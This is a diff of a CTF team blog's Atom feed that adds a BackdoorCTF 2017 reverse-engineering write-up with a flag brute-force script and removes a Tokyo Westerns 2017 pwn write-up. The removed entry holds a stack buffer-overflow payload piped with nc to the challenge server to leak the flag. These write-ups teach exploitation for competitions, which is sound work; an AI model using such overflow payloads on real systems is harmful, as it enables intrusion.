@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-09-26T05:41:55.080Z</updated>
+  <updated>2017-09-26T11:17:04.585Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -14,6 +14,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[Reverse] BackdoorCTF 2017 - NO-CALM</title>
+    <link href="https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/"/>
+    <id>https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/</id>
+    <published>2017-09-26T11:09:07.000Z</published>
+    <updated>2017-09-26T11:17:04.585Z</updated>
+    
+    <content type="html"><![CDATA[<p>Reverse challenge, using IDA to convert the binary into c pseudo code:<br><a data-fancybox="gallery" href="https://i.imgur.com/7mmkV78.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/7mmkV78.png" alt=""><br></a></p>
+<p>We can see that the flag must be in the arguments of the flag, each byte of the flag will be an argv, the flag has 31 bytes as we can see in <code>if</code> check. Looking at the generated code we can see that each byte of the flag is being saved from the variable v6 to v35. After this we can see a bunch of <code>if</code> verifications:<br><a data-fancybox="gallery" href="https://i.imgur.com/jwvteoW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jwvteoW.png" alt=""><br></a><br>We can see it checks 3 bytes at time, with 3 different operation checks:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(v7+v6-v8 == key[<span class="number">0</span>] &amp;&amp; v6-v7+v8 == key[<span class="number">1</span>] &amp;&amp; v7-v6+v8 == key[<span class="number">2</span>]) == <span class="literal">true</span></div></pre></td></tr></table></figure>
+<p>And this repeats for all 3 bytes along the flag… it’s simple to write a python script to brute force the flag:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">a =  string.printable</div><div class="line">keys = [<span class="number">81</span>,<span class="number">53</span>,<span class="number">87</span>,<span class="number">90</span>,<span class="number">156</span>,<span class="number">66</span>,<span class="number">98</span>,<span class="number">140</span>,<span class="number">92</span>,<span class="number">38</span>,<span class="number">170</span>,<span class="number">60</span>,<span class="number">29</span>,<span class="number">161</span>,<span class="number">69</span>,<span class="number">163</span>,<span class="number">27</span>,<span class="number">69</span>,<span class="number">147</span>,<span class="number">43</span>,<span class="number">59</span>,<span class="number">146</span>,<span class="number">86</span>,<span class="number">44</span>,<span class="number">67</span>,<span class="number">89</span>,<span class="number">75</span>,<span class="number">117</span>,<span class="number">125</span>,<span class="number">125</span>]</div><div class="line">flags = []</div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(keys),<span class="number">3</span>):</div><div class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> a:</div><div class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> a:</div><div class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> a:</div><div class="line">				<span class="keyword">if</span> ord(c)+ord(b)-ord(d) == keys[i] <span class="keyword">and</span> ord(b)-ord(c)+ord(d) == keys[i+<span class="number">1</span>] <span class="keyword">and</span> ord(c)-ord(b)+ord(d) == keys[i+<span class="number">2</span>]:</div><div class="line">					s += b+c+d</div><div class="line">					<span class="keyword">print</span> s</div></pre></td></tr></table></figure>
+<p>Running it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ python nocalm.py </div><div class="line">CTF</div><div class="line">CTF&#123;No</div><div class="line">CTF&#123;Now_t</div><div class="line">CTF&#123;Now_th1s</div><div class="line">CTF&#123;Now_th1s_1s</div><div class="line">CTF&#123;Now_th1s_1s_t0</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_A</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGR</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGRyy&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Reverse challenge, using IDA to convert the binary into c pseudo code:&lt;br&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/7mmkV78.pn
+    
+    </summary>
+    
+      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
+    
+    
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
+    
+      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
+    
+  </entry>
   
   <entry>
     <title>[Pwn] BackdoorCTF 2017 - baby0x41414141</title>
@@ -57,9 +88,9 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
       <category term="formatString" scheme="https://teamrocketist.github.io/tags/formatString/"/>
     
@@ -112,6 +143,8 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
@@ -119,8 +152,6 @@
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
     
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -195,9 +226,9 @@
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
     
@@ -751,11 +782,11 @@
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
   </entry>
   
@@ -917,44 +948,6 @@
       <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
     
       <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!</title>
-    <link href="https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/"/>
-    <id>https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/</id>
-    <published>2017-09-04T00:29:07.000Z</published>
-    <updated>2017-09-04T07:50:31.520Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>Just do it!<br>Problem<br><br>Do it! Do it!<br><br>nc pwn1.chal.ctf.westerns.tokyo 12345<br>(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)<br><br><a href="/content/files/tokyo-westerns-3rd-2007/just">just_do_it</a><br></blockquote>
-
-<p>Starting by De-assembler with ida and use its ability to some c pseudo code:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+8h] [bp-20h]@7</span></div><div class="line">  FILE *stream; <span class="comment">// [sp+18h] [bp-10h]@1</span></div><div class="line">  <span class="keyword">char</span> *v6; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  v6 = failed_message;</div><div class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">if</span> ( !stream )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"file open error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( !fgets(flag, <span class="number">48</span>, stream) )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"file read error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome my secret service. Do you know the password?"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Input the password."</span>);</div><div class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>) )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"input error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, PASSWORD) )</div><div class="line">    v6 = success_message;</div><div class="line">  <span class="built_in">puts</span>(v6);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>We can see clearly there is a buffer overflow problem on <code>strcmp</code> PASSWORD comes from <code>STDIN</code>, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server.  </p>
-<p>First lets just discover the offset we could know this by looking at the assembly code and check how space was saved in the stack for this variable by looking the offset from ebp or we can just use gdb with some help from metasploit to generate patterns:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 </div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line">$ gdb ./justdoit</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/evilgod/Documents/Hacking/ctf/tokyo/pwn/justdoit/just </div><div class="line">Welcome my secret service. Do you know the password?</div><div class="line">Input the password.</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line"></div><div class="line">Program received signal SIGSEGV (fault address 0x37614136)</div></pre></td></tr></table></figure>
-<p>We can see it broke at address <code>0x37614136</code> we again can calculate it in metasploit with pattern_offset</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136</div><div class="line">[*] Exact match at offset 20</div></pre></td></tr></table></figure>
-<p>Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag:  </p>
-<p><img src="https://i.imgur.com/kvzhTyr.png" alt="Flag Address"></p>
-<p>And finally writing a script:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">FLAG = <span class="number">0x0804A080</span></div><div class="line">payload = <span class="string">'A'</span> *<span class="number">20</span> + struct.pack(<span class="string">'&lt;L'</span>,FLAG)</div><div class="line"><span class="keyword">print</span> payload</div></pre></td></tr></table></figure>
-<p>getting the flag….<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 12482</div><div class="line">Welcome my secret service. Do you know the password?</div><div class="line">Input the password.</div><div class="line">TWCTF&#123;pwnable_warmup_I_did_it!&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;Just do it!&lt;br&gt;Problem&lt;br&gt;&lt;br&gt;Do it! Do it!&lt;br&gt;&lt;br&gt;nc pwn1.chal.ctf.westerns.tokyo 12345&lt;br&gt;(Alternative port: nc pwn1.chal.
-    
-    </summary>
-    
-      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
-    
-    
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
